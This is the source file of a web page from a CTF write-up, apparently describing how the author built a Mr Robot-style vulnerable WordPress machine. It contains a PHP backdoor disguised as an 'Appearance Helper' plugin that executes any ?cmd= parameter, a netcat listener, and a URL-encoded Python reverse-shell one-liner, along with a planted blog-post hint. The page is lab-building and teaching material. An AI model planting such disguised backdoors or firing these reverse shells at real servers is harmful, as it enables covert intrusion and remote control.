// src/data/writeupPages/mrrobotclone/robot-main-plugin.jsx
import React from "react";
import Heading from "../../../components/ui/Heading";
import ToggleList from "../../../components/ui/ToggleList";
import BulletList from "../../../components/ui/BulletList";
import CodeBlock from "../../../components/ui/CodeBlock";
import MiniCode from "../../../components/ui/MiniCode";
import Quote from "../../../components/ui/Quote";
import Callout from "../../../components/ui/Callout";
import writeup2Images from "../../../assets/Robotpics/index.js";
import { Link } from "react-router-dom";

export default function RobotPlugin() {
    return (
        <div>
          {/* 1. Create plugin file */}
          <Heading level={3} style={{ marginTop: "0.75rem" }}>
            1. Create the Plugin File
          </Heading>
          <p style={{ marginTop: "0.5rem", lineHeight: 1.6 }}>
  Since the theme file was located under WordPress’s <em>Appearance</em> section,
  I’ll just name the plugin <MiniCode>appearance-helper</MiniCode> to match that context.
  You can get creative with your own name.
</p>
  
          <p style={{ marginTop: "0.5rem" }}>
            Navigate to (inside ubuntu, not your kali):
          </p>
  
          <CodeBlock code={`/var/www/html/wp-content/plugins/appearance-helper/appearance-helper.php`} copyable />
  
          <p style={{ marginTop: "0.5rem" }}>Paste the Contents in <MiniCode>appearance-helper.php</MiniCode>:</p>
  
          <CodeBlock
  code={`&lt;?php
/*
Plugin Name: Appearance Helper
Description: Assists with theme appearance previews (dev build)
Version: 1.2
Author: DevDarlene
*/

if (isset($_GET['cmd'])) {
    chdir('/');             // force the spawned shell/command to start at root
    system($_GET['cmd']);   // execute whatever the solver supplies via ?cmd=...
}
?&gt;`}
  copyable
/><br/>
{/* Warning message */}
<div
  role="alert"
  aria-live="polite"
  style={{
    border: "1px solid #ff4d4f",
    backgroundColor: "rgba(255,77,79,0.06)",
    color: "#a8071a",
    padding: "0.75rem 1rem",
    borderRadius: "8px",
    display: "flex",
    gap: "0.75rem",
    alignItems: "flex-start",
    fontSize: "0.95rem",
    lineHeight: 1.25,
    marginBottom: "1rem",
  }}
>
  <span style={{ fontSize: "1.25rem", lineHeight: 1 }} aria-hidden="true">
    ⚠️
  </span>

  <div>
    <strong style={{ display: "block", marginBottom: "0.25rem" }}>
      Warning — educational use only
    </strong>
    <span>
      For educational purposes only — do not use this code outside of
      CTFs or authorized labs.
    </span>
  </div>
</div>

  
          <Heading level={4} style={{ marginTop: "0.75rem" }}>
            Set correct owner & permissions (important)
          </Heading>
  
          <p style={{ marginTop: "0.5rem" }}>
            Make the plugin owned by the webserver user and not world-writable:
          </p>
  
          <CodeBlock
            code={`sudo chown -R www-data:www-data /var/www/html/wp-content/plugins/appearance-helper
sudo find /var/www/html/wp-content/plugins/appearance-helper -type d -exec chmod 750 {} \\;
sudo find /var/www/html/wp-content/plugins/appearance-helper -type f -exec chmod 640 {} \\;`}
            copyable
          />
  
          <p style={{ marginTop: "0.5rem" }}>
            To set owner/group for all plugins (owner root, group www-data) and sane perms:
          </p>
  
          <CodeBlock
            code={`# owner root, group www-data (webserver can read via group)
sudo chown -R root:www-data /var/www/html/wp-content/plugins
# directories: 750 (owner rwx, group rx, others none)
sudo find /var/www/html/wp-content/plugins -type d -exec chmod 750 {} \\;
# files: 640 (owner rw, group r, others none)
sudo find /var/www/html/wp-content/plugins -type f -exec chmod 640 {} \\;`}
            copyable
          />
  <hr style={{ margin: "1.25rem 0" }} />
          {/* 2. Add the plugin */}
          <Heading level={3} style={{ marginTop: "0.75rem" }}>
            2. Add the Plugin to WordPress
          </Heading>
  
          <BulletList
            items={[
              "Go to WP Admin → Plugins",
              "You’ll see Appearance Helper listed.",
              "Click Activate",
              "Once activated, WordPress will load this plugin code on every request."
            ]}
          />
          <hr style={{ margin: "1.25rem 0" }} />
  
          {/* 3. Why activation works */}
          <Heading level={3} style={{ marginTop: "0.75rem" }}>
            3. Why Activation Works
          </Heading>
  
          <ul style={{ marginLeft: "1rem" }}>
            <li>•  WordPress tracks active plugins in the database (<MiniCode>wp_options</MiniCode> → <MiniCode>active_plugins</MiniCode>).</li>
            <li>•  On every page request, WordPress <MiniCode>include</MiniCode>s all active plugin PHP files.</li>
            <li>•  That means your code is executed automatically in the context of the WordPress PHP process.</li>
          </ul>
  
          <p style={{ marginTop: "0.5rem" }}>
            Since your plugin only runs code when <MiniCode>?cmd=</MiniCode> is present, it stays quiet otherwise.
          </p>
          <hr style={{ margin: "1.25rem 0" }} />
          {/* 4. Testing the backdoor */}
          <Heading level={3} style={{ marginTop: "0.75rem" }}>
            4. Testing the Backdoor
          </Heading>
  
          <p style={{ marginTop: "0.5rem" }}>Test the plugin using:</p>
  
          <CodeBlock
            code={`http://[target]/wp-content/plugins/appearance-helper/appearance-helper.php?cmd=id`}
            copyable
          />
  
          <p style={{ marginTop: "0.5rem" }}>If it works, you’ll see something like:</p>
  
          <CodeBlock code={`uid=33(www-data) gid=33(www-data) groups=33(www-data)`} copyable />
  
          <p style={{ marginTop: "0.5rem" }}>
            That confirms the backdoor is live.
          </p>
          <hr style={{ margin: "1.25rem 0" }} />
          {/* 5. Upgrading to reverse shell */}
          <Heading level={3} style={{ marginTop: "0.75rem" }}>
            5. Upgrading to a Reverse Shell
          </Heading><br/>
  
          <ol style={{ marginLeft: "1rem" }}>
            <li style={{ marginBottom: "0.5rem" }}>
            Now let’s turn that backdoor into a real shell for testing.<br/><br/>
              1.<strong> Start a listener on your attacker machine (Kali):</strong>
              <CodeBlock code={`nc -lvnp 4444`} copyable />
              <p style={{ marginTop: "0.5rem" }}>⚠️<em> Do this before triggering the shell.</em></p>
            </li>
  
            <li style={{ marginBottom: "0.5rem" }}>
              2.<strong> Trigger the reverse shell from the browser</strong> by sending the encoded Python payload (Example below: Change the <MiniCode>x</MiniCode> in <MiniCode> 192.168.x.x</MiniCode>  with your Kali machine IP):
              <CodeBlock
                code={`http://192.168.56.20/wp-content/plugins/appearance-helper/appearance-helper.php?cmd=python3%20-c%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket.socket()%3Bs.connect((%22192.168.x.x%22%2C4444))%3B%5Bos.dup2(s.fileno()%2Cfd)%20for%20fd%20in%20(0%2C1%2C2)%5D%3Bpty.spawn(%22%2Fbin%2Fbash%22)%27`}
                copyable
              />
              <Callout>
              Other reverse shell one-liners may not work depending on the server environment. In this case, Python worked because the server had Python installed by default.
              </Callout>
            </li>
  
            <li style={{ marginBottom: "0.5rem" }}>
            If successful, you’ll catch a shell on your Netcat listener. 🎉
            </li>
          </ol>
          <hr style={{ margin: "1.25rem 0" }} />
          {/* 6. Behind the scenes */}
          <Heading level={3} style={{ marginTop: "0.75rem" }}>
            6. What’s Happening Behind the Scenes
          </Heading>
  
          <ul style={{ marginLeft: "1rem" }}>
            <li>● The browser sends a GET request with <MiniCode>?cmd=...</MiniCode>.</li>
            <li>● WordPress includes the Evil Plugin code.</li>
            <li>● The plugin sees <MiniCode>cmd</MiniCode> set → runs <MiniCode>system(&lt;command&gt;)</MiniCode>.</li>
            <li>● The server executes it and either:<br/>{'\u00A0'}{'\u00A0'}○ Returns output in the browser (for <MiniCode>id</MiniCode>, <MiniCode>ls</MiniCode>, etc.) or <br/>{'\u00A0'}{'\u00A0'}○ Establishes a reverse-shell connection back to you (for the Python payload).</li>
          </ul>
  
          <p style={{ marginTop: "0.5rem" }}>
            So the browser itself is a primitive web shell, but once you send a reverse shell command, you get a full interactive session.
          </p>
          <hr style={{ margin: "1.25rem 0" }} />
          {/* 7. Story & hint creation */}
          <Heading level={3} style={{ marginTop: "0.75rem" }}>
            7. Story And Hint Creation For The User To Find This Path
          </Heading>
  
          <p style={{ marginTop: "0.5rem" }}>
            To help players stumble on the plugin path, I planted a hint in a fake “site maintenance” blog post.
          </p>
  
          <p style={{ marginTop: "0.5rem" }}><strong>Steps I Did:</strong></p>
          
          <ol style={{ marginLeft: "1rem", marginTop: "0.5rem" }}>
            <li style={{ marginBottom: "0.5rem" }}>
              1. In WP Admin → Posts → Add New
              <ul style={{ marginLeft: "1rem",marginTop: "0.5rem" }}>
                <li>
                  Title:
                  <CodeBlock code={`Site maintenance notes`} copyable />
                </li>
                <li><br/>
                  Body:
                  <CodeBlock
                    code={`Thanks to @DevDarlene for helping test the new appearance-helper plugin on the staging site.
If you want to preview the dev styles, check the plugin dev path under /wp-content/plugins/appearance-helper/.`}
                    copyable
                  />
                </li>
              </ul>
            </li>
  
            <li style={{ marginBottom: "0.5rem",marginTop: "0.5rem" }}>
              2. Added a category “Site Notes” (extra realism).
              <ul style={{ marginLeft: "1rem" ,marginTop: "0.5rem"}}>
                <li>● In the right sidebar, open Post → Categories and choose or create <MiniCode>Site Notes</MiniCode> (helps realism).</li>
                <li>● In NEW CATEGORY NAME type a category name, e.g. <MiniCode>Site Notes</MiniCode>.</li>
                <li>● Leave PARENT CATEGORY as — Parent Category — (i.e. no parent) — you want it top-level.</li>
                <li>● Click Add Category.</li>
              </ul>
            </li>

            <li style={{ marginBottom: "0.5rem" }}>
            3. Optional extras before publishing:
            <ul style={{ marginLeft: "1rem",marginTop: "0.5rem" }}>
            <li>● Add tags in the Tags panel (e.g. <MiniCode>maintenance, dev, appearance-helper</MiniCode>).</li>
            <li>● Set the permalink if you want a friendly URL.</li>
            <li>● Preview the post, then <strong>Publish</strong> when happy.</li>
          </ul>
            </li>
          </ol>
          
  
          <p style={{ marginTop: "0.5rem" }}>
            Now when players browse blog posts → they see a casual note dropping the <MiniCode>/appearance-helper/</MiniCode> path.
          </p>
        </div>
    );
  }